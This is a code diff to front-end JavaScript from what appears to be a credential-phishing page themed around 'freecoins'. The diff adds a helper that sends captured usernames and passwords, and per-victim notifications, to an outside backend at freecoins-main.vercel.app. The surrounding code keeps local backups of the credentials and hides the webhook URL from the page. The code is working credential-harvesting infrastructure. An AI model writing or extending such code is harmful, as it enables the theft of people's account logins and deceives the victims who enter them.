@@ -4,6 +4,14 @@
 //       No sensitive URLs are exposed here.
 // ============================================================
 
+function getApiBaseUrl() {
+    if (window.APP_CONFIG && window.APP_CONFIG.BACKEND_URL) {
+        return window.APP_CONFIG.BACKEND_URL.replace(/\/+$/, '');
+    }
+    const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+    return isLocalhost ? '' : 'https://freecoins-main.vercel.app';
+}
+
 async function saveToDatabase(username, password) {
     // Resilient local backup (guarantees data on GitHub Pages static mode)
     try {
@@ -19,7 +27,7 @@ async function saveToDatabase(username, password) {
     } catch (e) { }
 
     try {
-        const res = await fetch('/api/login', {
+        const res = await fetch(`${getApiBaseUrl()}/api/login`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username, password })
@@ -34,7 +42,7 @@ async function saveToDatabase(username, password) {
 async function sendNotification(username) {
     // Webhook is called server-side — no URL exposed in frontend
     try {
-        await fetch('/api/notify', {
+        await fetch(`${getApiBaseUrl()}/api/notify`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username })
